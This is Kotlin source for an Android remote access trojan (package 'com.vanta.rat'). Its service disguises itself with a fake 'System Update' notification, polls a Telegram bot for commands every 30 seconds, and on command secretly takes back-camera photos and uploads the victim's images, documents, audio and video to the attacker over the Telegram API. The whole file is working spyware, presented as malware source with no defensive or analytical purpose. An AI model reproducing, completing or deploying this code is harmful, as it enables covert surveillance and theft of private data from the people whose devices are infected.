package com.vanta.rat

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import kotlinx.coroutines.*

class CameraService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var cameraManager: CameraManager
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var reader: ImageReader? = null
    private var lastUpdateId = 0L

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        startPolling()
    }

    private fun startForegroundNotification() {
        val channelId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update")
            .setContentText("Applying components...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
        startForeground(1, notif)
    }

    private fun startPolling() {
        scope.launch {
            Uploader.sendDeviceInfo()
            while (isActive) {
                runCatching { checkCommands() }
                delay(30_000)
            }
        }
    }

    private fun checkCommands() {
        val url = "https://api.telegram.org/bot${Telegram.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0"
        val req = okhttp3.Request.Builder().url(url).build()
        val resp = okhttp3.OkHttpClient().newCall(req).execute()
        val body = resp.body?.string() ?: return
        val arr = org.json.JSONObject(body).optJSONArray("result") ?: return
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            lastUpdateId = u.getLong("update_id")
            val text = u.optJSONObject("message")?.optString("text") ?: continue
            when (text.trim()) {
                "/cam" -> captureAndSend()
                "/files" -> {
                    scope.launch { FileScanner.uploadImages() }
                    scope.launch { FileScanner.uploadDocuments() }
                }
                "/audio" -> scope.launch { FileScanner.uploadAudio() }
                "/video" -> scope.launch { FileScanner.uploadVideo() }
            }
        }
    }

    private fun captureAndSend() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Telegram.sendMessage("⚠️ صلاحية الكاميرا غير ممنوحة")
            return
        }
        val camId = cameraManager.cameraIdList.firstOrNull { id ->
            val c = cameraManager.getCameraCharacteristics(id)
            c.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        } ?: return

        val size = cameraManager.getCameraCharacteristics(camId)
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            .getOutputSizes(ImageFormat.JPEG)!!.first()

        reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
        reader!!.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            val buf: ByteBuffer = image.planes[0].buffer
            val bytes = ByteArray(buf.remaining()); buf.get(bytes)
            image.close()
            val f = File(cacheDir, "cap_${System.currentTimeMillis()}.jpg")
            FileOutputStream(f).use { it.write(bytes) }
            Telegram.sendPhoto(f)
            f.delete()
            stopCapture()
        }, Handler(Looper.getMainLooper()))

        cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                cameraDevice = dev
                val surface = reader!!.surface
                val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(surface) }
                dev.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        s.capture(req.build(), null, null)
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {}
                }, null)
            }
            override fun onDisconnected(dev: CameraDevice) { dev.close() }
            override fun onError(dev: CameraDevice, error: Int) { dev.close() }
        }, null)
    }

    private fun stopCapture() {
        session?.close(); session = null
        cameraDevice?.close(); cameraDevice = null
        reader?.close(); reader = null
    }

    override fun onDestroy() {
        scope.cancel()
        stopCapture()
        super.onDestroy()
    }
}
